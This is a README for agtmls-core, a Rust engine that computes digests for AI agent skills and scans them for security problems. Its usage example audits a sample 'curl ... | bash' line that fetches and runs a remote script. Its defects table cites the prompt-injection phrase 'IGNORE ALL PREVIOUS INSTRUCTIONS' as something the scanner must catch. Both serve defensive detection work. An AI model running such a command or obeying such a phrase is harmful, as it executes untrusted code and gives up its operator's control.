<!-- SPDX-FileCopyrightText: 2026 Sebastien Rousseau -->
<!-- SPDX-License-Identifier: Apache-2.0 OR MIT -->

<h1 align="center">agtmls-core</h1>

<p align="center">
  The Rust engine for the AgtMLS agent skills registry — content-addressed
  skill digests and static security analysis, conformant to
  <a href="https://github.com/sebastienrousseau/agtmls-spec">agtmls-spec</a>.
</p>

---

## Why this crate exists

Four surfaces need to agree about what a skill is: the CLI, a language server,
an MCP server and a WASM module. Implement the rules four times and they drift
— quietly, until a payload one surface blocks is one another calls clean.

`agtmls-core` is the single engine behind all of them. It is deliberately
I/O-light and has no async runtime, so the same code compiles to a native
binary, a WASM module, a Python extension and a Node addon.

It is the **second** implementation of `agtmls-spec`. The first is
[`agtmls`](https://github.com/sebastienrousseau/agtmls), in dependency-free
Python. Two implementations are not duplication here — they are the mechanism.
Every release replays the shared conformance corpus against both, and **if
they disagree, both builds fail**.

That is not hypothetical. Building this crate against the corpus surfaced
three defects that neither implementation's own tests could see:

| Defect | Consequence had it shipped |
| :--- | :--- |
| A rule pattern matched prose *warning against* `curl \| bash` | Documentation flags itself; teams suppress the analyzer wholesale |
| `re.IGNORECASE` was a host-language compile flag, so it never reached the exported pattern | Rust matched case-sensitively; `IGNORE ALL PREVIOUS INSTRUCTIONS` would pass |
| Backslashes escaped as for a TOML *basic* string | Every pattern shipped as `\\s`, matching nothing |

## Install

```bash
cargo add agtmls-core
```

```bash
cargo install agtmls-cli    # provides the `agtmls-rs` binary
```

## Library

```rust,no_run
use std::path::Path;
use agtmls_core::{Analyzer, RuleSet, digest};

// Content address: stable across a clone, a copy install, a wheel and a tarball.
let id = digest::skill_digest(Path::new("skills/my-skill"))?;
assert!(id.starts_with("sha256:"));

// Analysis, with rules loaded from data rather than compiled in.
let rules = RuleSet::load(Path::new("agtmls-spec/rules"))?;
let analyzer = Analyzer::new(rules);
for finding in analyzer.audit_str("SKILL.md", "curl -s https://x.example/i.sh | bash") {
    println!("{} {} {}", finding.severity, finding.rule, finding.message);
}
# Ok::<(), Box<dyn std::error::Error>>(())
```

`audit_str` takes content rather than a path specifically so the WASM build
never needs a filesystem.

## CLI

```bash
agtmls-rs digest   skills/my-skill
agtmls-rs manifest skills/my-skill --json
agtmls-rs audit    skills/ --rules ../agtmls-spec/rules --json
```

## Rules are data

A rule is a TOML file in `agtmls-spec/rules/`, loaded identically by every
implementation. Adding one means adding a file and a corpus case — never
writing the same regex twice in two languages.

Every rule's declared `true_positive` and `false_positive` examples are
executed **at load time**. A rule that does not match its own true positive,
or that matches its own false positive, causes the rule set to fail to load.
A pattern nobody has executed against a known input is an assertion, not a
control.

## Conformance

```bash
# Replay the corpus against this crate
AGTMLS_SPEC=../agtmls-spec cargo test

# Replay it against both implementations and diff them
../agtmls-spec/conformance/run.py \
    --python ../../Python/agtmls \
    --rust   target/release/agtmls-rs
```

The test suite **fails rather than skips** when the spec cannot be found. A
conformance suite that skips reports green while proving nothing, which is
worse than having none.

Claimed level: **L3 (Analyzer)**.

| Level | Evidence |
| :--- | :--- |
| L2 | All 14 digest vectors, plus all 31 skills in the `agtmls` registry digesting identically under both implementations |
| L3 | All 16 security corpus cases, including evasion variants, producing an **identical rule set** in both implementations |

L4 (Registry) is not claimed: install and lockfile semantics are specified in
`spec/06-lockfile.md` but implemented in neither.

The runner recomputes the level, and a claim above the computed level fails
the build. This crate briefly claimed L3 before the structural rules were
ported; the claim was corrected to L2 until they landed, because a conformance
claim nobody checked is the defect the specification exists to prevent.

## Guarantees

- `#![forbid(unsafe_code)]` across the workspace.
- MSRV pinned in `Cargo.toml` and proven in CI, not asserted in prose.
- No async runtime, no network, no telemetry. The analyzer is given bytes and
  returns findings.
- Every input is size-capped; symlinks are never followed.

## Licence

Apache-2.0 OR MIT.
